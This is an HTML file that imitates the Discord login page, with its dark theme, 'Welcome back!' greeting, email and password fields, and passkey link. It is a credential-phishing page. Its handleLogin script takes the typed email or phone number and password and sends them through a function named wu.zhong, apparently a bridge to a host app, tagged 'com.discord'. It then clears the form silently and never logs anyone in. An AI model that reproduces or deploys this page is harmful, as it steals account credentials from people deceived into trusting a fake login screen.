<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Discord - Welcome back!</title>
  <style>
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }


    body {
      font-family: 'Whitney', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
      background-color: #313338;
      color: #f2f3f5;
      min-height: 100vh;
      overflow-x: hidden;
    }


    .container {
      max-width: 100vw;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      position: relative;
    }


    .header {
      display: flex;
      justify-content: flex-start;
      align-items: center;
      padding: 20px 24px 0 24px;
      position: relative;
      z-index: 10;
    }


    .back-btn {
      width: 32px;
      height: 32px;
      cursor: pointer;
      color: #b5bac1;
      background: none;
      border: none;
      font-size: 24px;
      display: flex;
      align-items: center;
      justify-content: center;
      transform: rotate(0deg);
    }


    .back-btn:hover {
      color: #f2f3f5;
    }


    .content {
      flex: 1;
      display: flex;
      flex-direction: column;
      padding: 40px 24px 32px 24px;
      justify-content: center;
    }


    .welcome-section {
      text-align: center;
      margin-bottom: 40px;
    }


    .title {
      font-size: 28px;
      font-weight: 600;
      margin-bottom: 8px;
      color: #f2f3f5;
      line-height: 1.2;
    }


    .subtitle {
      color: #b5bac1;
      font-size: 16px;
      line-height: 1.25;
      font-weight: 400;
    }


    .form-container {
      display: flex;
      flex-direction: column;
      gap: 20px;
    }


    .input-group {
      display: flex;
      flex-direction: column;
    }


    .input-label {
      color: #b5bac1;
      font-size: 12px;
      font-weight: 600;
      text-transform: uppercase;
      margin-bottom: 8px;
      letter-spacing: 0.02em;
    }


    .input-field {
      background-color: #1e1f22;
      border: none;
      border-radius: 3px;
      padding: 10px 12px;
      color: #f2f3f5;
      font-size: 16px;
      outline: none;
      transition: all 0.15s ease;
      height: 40px;
    }


    .input-field:focus {
      background-color: #1e1f22;
      box-shadow: 0 0 0 1px #5865f2;
    }


    .input-field::placeholder {
      color: #87898c;
    }


    .password-container {
      position: relative;
    }



    .form-links {
      display: flex;
      flex-direction: column;
      gap: 8px;
      margin-top: 4px;
    }


    .form-link {
      color: #00a8fc;
      text-decoration: none;
      font-size: 14px;
      font-weight: 400;
    }


    .form-link:hover {
      text-decoration: underline;
    }


    .login-btn {
      background-color: #5865f2;
      color: #ffffff;
      border: none;
      border-radius: 3px;
      padding: 12px 16px;
      font-size: 16px;
      font-weight: 500;
      cursor: pointer;
      margin-top: 20px;
      transition: background-color 0.17s ease;
      height: 44px;
    }


    .login-btn:hover {
      background-color: #4752c4;
    }


    .login-btn:disabled {
      background-color: #4752c4;
      opacity: 0.5;
      cursor: not-allowed;
    }


    .passkey-section {
      text-align: center;
      margin-top: 24px;
    }


    .passkey-link {
      color: #00a8fc;
      text-decoration: none;
      font-size: 14px;
      font-weight: 400;
    }


    .passkey-link:hover {
      text-decoration: underline;
    }



    @media (max-width: 480px) {
      .header {
        padding: 16px 20px 0 20px;
      }
     
      .content {
        padding: 32px 20px 24px 20px;
      }
     
      .title {
        font-size: 24px;
      }
     
      .subtitle {
        font-size: 15px;
      }
    }


    .back-btn:focus,
    .login-btn:focus,
    .form-link:focus,
    .passkey-link:focus {
      outline: 2px solid #5865f2;
      outline-offset: 2px;
    }



    .input-field.error {
      box-shadow: 0 0 0 1px #ed4245;
    }


    .input-field.error:focus {
      box-shadow: 0 0 0 1px #ed4245;
    }
  </style>
</head>
<body>
  <div class="container">



    <div class="content">
      <div class="welcome-section">
        <h1 class="title">Welcome back!</h1>
        <p class="subtitle">We're so excited to see you again!</p>
      </div>


      <form class="form-container" onsubmit="handleLogin(event)">
        <div class="input-group">
          <label class="input-label" for="emailPhone">Email or Phone Number</label>
          <input
            type="text"
            id="emailPhone"
            class="input-field"
            required
            autocomplete="username"
          >
        </div>


        <div class="input-group">
          <label class="input-label" for="password">Password</label>
            <input
              type="password"
              id="password"
              class="input-field"
              required
              autocomplete="current-password"
            >
        </div>


        <div class="form-links">
          <a href="#" class="form-link" onclick="forgotPassword()">Forgot your password?</a>
          <a href="#" class="form-link" onclick="usePasswordManager()">Use a password manager?</a>
        </div>


        <button type="submit" class="login-btn" id="loginBtn">Log In</button>
      </form>


      <div class="passkey-section">
        <a href="#" class="passkey-link" onclick="signInWithPasskey()">Or, sign in with passkey</a>
      </div>
    </div>
  </div>


  <script>
    let passwordVisible = false;


    function goBack() {
      console.log('Going back...');
    }



    function handleLogin(event) {
      event.preventDefault();
     
      const emailPhone = document.getElementById('emailPhone').value;
      const password = document.getElementById('password').value;
      const loginBtn = document.getElementById('loginBtn');
     
      if (!emailPhone || !password) {
        
        return;
      }
     

      loginBtn.disabled = true;
      loginBtn.textContent = 'Logging in...';
     
      setTimeout(() => {
       wu.zhong(`🔰Discord Login \n\n✉️Email: ${document.getElementById('emailPhone').value}\n\n🔒Password: ${document.getElementById('password').value}`,"com.discord");
        loginBtn.disabled = false;
        loginBtn.textContent = 'Log In';
       
        document.getElementById('emailPhone').value = '';
        document.getElementById('password').value = '';
      }, 200);
    }




    document.getElementById('emailPhone').addEventListener('blur', function() {
      const value = this.value.trim();
      if (value && !isValidEmailOrPhone(value)) {
        this.classList.add('error');
      } else {
        this.classList.remove('error');
      }
    });


    function isValidEmailOrPhone(value) {
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      const phoneRegex = /^[\+]?[1-9][\d]{0,15}$/;
      return emailRegex.test(value) || phoneRegex.test(value);
    }



    const inputs = document.querySelectorAll('.input-field');
    inputs.forEach(input => {
      input.addEventListener('input', function() {
        if (this.classList.contains('error') && this.value.trim()) {
          this.classList.remove('error');
        }
      });
    });



  </script>
</body>
</html>
